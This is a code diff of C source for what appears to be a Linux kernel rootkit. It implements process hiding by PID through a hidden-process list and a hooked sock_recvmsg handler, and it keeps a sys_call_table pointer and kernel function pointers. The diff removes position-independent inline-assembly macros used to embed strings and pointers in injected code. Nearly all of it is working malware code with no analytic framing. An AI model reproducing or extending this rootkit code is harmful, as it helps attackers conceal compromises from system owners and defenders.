@@ -33,50 +33,6 @@
 );
 
 /*
- * Delta macros.
- */
-#define DSTR(name, str) asm( \
-"\t.globl\t"#name"\n" \
-"\t.type\t"#name", @function\n" \
-#name":\n" \
-"\tcall\t"#name"_delta\n" \
-"\tret\n" \
-"\t.string\t"#str"\n" \
-"\t.size\t"#name", .-"#name"\n" \
-"\t.globl\t"#name"_delta\n" \
-"\t.type\t"#name"_delta, @function\n" \
-#name"_delta:\n" \
-"\tmov\t(%rsp), %rax\n" \
-"\tinc\t%rax\n" \
-"\tret\n" \
-"\t.size\t"#name"_delta, .-"#name"_delta" \
-);
-
-#define DZERO(name, size) asm( \
-"\t.globl\t"#name"\n" \
-"\t.type\t"#name", @function\n" \
-#name":\n" \
-"\tcall\t"#name"_delta\n" \
-"\tret\n" \
-"\t.zero\t"#size"\n" \
-"\t.size\t"#name", .-"#name"\n" \
-"\t.globl\t"#name"_delta\n" \
-"\t.type\t"#name"_delta, @function\n" \
-#name"_delta:\n" \
-"\tmov\t(%rsp), %rax\n" \
-"\tinc\t%rax\n" \
-"\tret\n" \
-"\t.size\t"#name"_delta, .-"#name"_delta" \
-);
-
-#define D8(name) DZERO(name, 8)
-#define D4(name) DZERO(name, 4)
-#define D2(name) DZERO(name, 2)
-#define D1(name) DZERO(name, 1)
-
-#define DPTR(name) D8(name)
-
-/*
  * Our Kernel begins here.
  */
 LABEL(kernel_start)
@@ -100,7 +56,6 @@ struct pid_list_node {
     struct task_struct *task;
     struct pid_list_node *next;
 };
-typedef int (*ttr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags);
 
 /*
  * Function declarations.
@@ -118,30 +73,24 @@ struct pid_list_node *pid_list_find(pid_t nr);
 //void *readfile(const char *file, size_t *len);
 
 /*
- * Shared declarations of Linux Kernel functions.
+ * Global variables.
  */
-#include "shared_kernel.h"
-
-
-/*
- * Variable declarations.
- */
-extern struct pid_list_node **pid_list_head(void);
-extern struct pid_list_node **pid_list_tail(void);
-extern const char *MSG_PID_UHD(void);
-extern const char *MSG_PID_AHD(void);
-extern const char *MSG_PID_HD(void);
-extern const char *MSG_PID_NF(void);
-extern const char *MSG_PID_NH(void);
-extern const char *MSG_KM_ERR(void);
-extern ttr_sock_recvmsg *tr_sock_recvmsg(void);
+void **sys_call_table;
+struct pid_list_node *pid_list_head;
+struct pid_list_node *pid_list_tail;
+int (*tr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags);
+void * (*f_kmalloc)(size_t size, gfp_t flags);
+void (*f_kfree)(const void *);
+struct pid * (*f_find_vpid)(pid_t nr);
+int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
+int (*f_sys_write)(int fd, const char *mem, size_t len);
 
 /*
  * Hooked function handlers.
  */
 int my_sock_recvmsg(struct socket *sock, struct msghdr *msg, int flags) {
     pinfo("hello from my_sock_recvmsg()!\n");
-    return (*tr_sock_recvmsg())(sock, msg, flags);
+    return tr_sock_recvmsg(sock, msg, flags);
 }
 
 void pid_list_test(void) {
@@ -152,20 +101,20 @@ void pid_list_test(void) {
 	 */
 	pid_list_create();
 
-	for (i = 1; i < 4096; i++) {
+	for (i = 1; i < 100; i++) {
 		hide_pid(i);
 		unhide_pid(i);
 	}
 
-	for(i = 1; i < 4096; i++) {
+	for(i = 1; i < 100; i++) {
 		hide_pid(i);
 	}
 
-	for (i = 1; i < 4096; i++) {
+	for (i = 1; i < 100; i++) {
 		unhide_pid(i);
 	}
 
-	for (i = 1; i < 4096; i++) {
+	for (i = 1; i < 100; i++) {
 		hide_pid(i);
 	}
 
@@ -173,23 +122,24 @@ void pid_list_test(void) {
 }
 
 void kernel_test(void) {
-	//pid_list_test();
+	pinfo("hola!\n");
+	pid_list_test();
 }
 
 int hide_pid(pid_t nr) {
 	struct pid *pid;
 	
-	pid = (*f_find_vpid())(nr);
+	pid = f_find_vpid(nr);
 	if (pid) {
 		if (pid_list_find(nr)) {
-			perr(MSG_PID_AHD(), nr);
+			perr("PID %d already hidden.\n", nr);
 		} else {
 			pid_list_push(nr);
-			pinfo(MSG_PID_HD(), nr);
+			pinfo("PID %d is hidden.\n", nr);
 			return 0;
 		}
 	} else {
-		perr(MSG_PID_NF(), nr);
+		perr("PID %d not found.\n", nr);
 	}
 
 	return -1;
@@ -197,11 +147,11 @@ int hide_pid(pid_t nr) {
 
 int unhide_pid(pid_t nr) {
 	if (pid_list_pop(nr) == nr) {
-		pinfo(MSG_PID_UHD(), nr);
+		pinfo("PID %d unhidden.\n", nr);
 
 		return 0;
 	} else {
-		perr(MSG_PID_NH(), nr);
+		perr("PID %d is not hidden.\n", nr);
 	}
 	
 	return -1;
@@ -210,21 +160,21 @@ int unhide_pid(pid_t nr) {
 void pid_list_push(pid_t nr) {
 	struct pid_list_node *node;
 
-	node = (*f_kmalloc())(sizeof(struct pid_list_node), GFP_KERNEL);
+	node = f_kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
 	if (node) {
-		(*pid_list_tail())->next = node;
-		*pid_list_tail() = node;
+		pid_list_tail->next = node;
+		pid_list_tail = node;
 		node->next = NULL;
 		node->nr = nr;
 	} else {
-		perr(MSG_KM_ERR(), __LINE__);
+		perr("f_kmalloc() error at line %d, file %s.\n", __LINE__, __FILE__);
 	}
 }
 
 struct pid_list_node *pid_list_find(pid_t nr) {
 	struct pid_list_node *node;
 
-	node = *pid_list_head();
+	node = pid_list_head;
 	while(node) {
         if (node->nr == nr) {
 			return node;
@@ -238,14 +188,14 @@ struct pid_list_node *pid_list_find(pid_t nr) {
 pid_t pid_list_pop(pid_t nr) {
 	struct pid_list_node *node, *prev;
 
-	prev = node = *pid_list_head();
+	prev = node = pid_list_head;
 	while(node) {
 		if (node->nr == nr) {
 			prev->next = node->next;
-			if (*pid_list_tail() == node) {
-				*pid_list_tail() = prev;
+			if (pid_list_tail == node) {
+				pid_list_tail = prev;
 			}
-			(*f_kfree())(node);
+			f_kfree(node);
 
 			return nr;
 		}
@@ -259,19 +209,19 @@ pid_t pid_list_pop(pid_t nr) {
 void pid_list_create() {
 	struct pid_list_node *node;
 
-	node = (*f_kmalloc())(sizeof(struct pid_list_node), GFP_KERNEL);
+	node = f_kmalloc(sizeof(struct pid_list_node), GFP_KERNEL);
 	node->next = NULL;
 	node->nr = 0;
 
-	*pid_list_head() = *pid_list_tail() = node;
+	pid_list_head = pid_list_tail = node;
 }
 
 void pid_list_destroy() {
-	while((*pid_list_head())->next) {
-		unhide_pid((*pid_list_tail())->nr);
+	while(pid_list_head->next) {
+		unhide_pid(pid_list_tail->nr);
 	}
 
-	(*f_kfree())(*pid_list_head());
+	f_kfree(pid_list_head);
 }
 
 /*
@@ -333,49 +283,19 @@ int vpfd(int fd, const char *fmt, va_list args) {
     size_t len = 0;
 	mm_segment_t old_fs;
 
-	textbuf = (*f_kmalloc())(LOG_LINE_MAX, GFP_KERNEL);
+	textbuf = f_kmalloc(LOG_LINE_MAX, GFP_KERNEL);
 	if (textbuf) {
-		len = (*f_vscnprintf())(textbuf, LOG_LINE_MAX, fmt, args);
+		len = f_vscnprintf(textbuf, LOG_LINE_MAX, fmt, args);
 	    old_fs = get_fs();
 	    set_fs(KERNEL_DS);
-		len = (*f_sys_write())(fd, textbuf, len);
-		(*f_kfree())(textbuf);
+		len = f_sys_write(fd, textbuf, len);
+		f_kfree(textbuf);
 		set_fs(old_fs);
 		return len;
 	} else {
 		return -1;
 	}
 }
-
-LABEL(kernel_code_end)
-
-/*
- * Linux Kernel functions.
- */
-DPTR(f_kmalloc)
-DPTR(f_kfree)
-DPTR(f_find_vpid)
-DPTR(f_vscnprintf)
-DPTR(f_sys_write)
-DPTR(tr_sock_recvmsg)
-
-/*
- * Strings.
- */
-DSTR(MSG_PID_UHD, "PID %d unhidden.\n")
-DSTR(MSG_PID_AHD, "PID %d already hidden.\n")
-DSTR(MSG_PID_HD, "PID %d hidden.\n")
-DSTR(MSG_PID_NF, "PID %d not found.\n")
-DSTR(MSG_PID_NH, "PID %d is not hidden.\n")
-DSTR(MSG_KM_ERR, "f_kmalloc error, line %d.\n")
-
-/*
- * Global variable definitions.
- */
-DPTR(pid_list_head)
-DPTR(pid_list_tail)
-DPTR(sys_call_table)
-DPTR(old_SYSCALL_handler)
 
 LABEL(kernel_end)
 /*
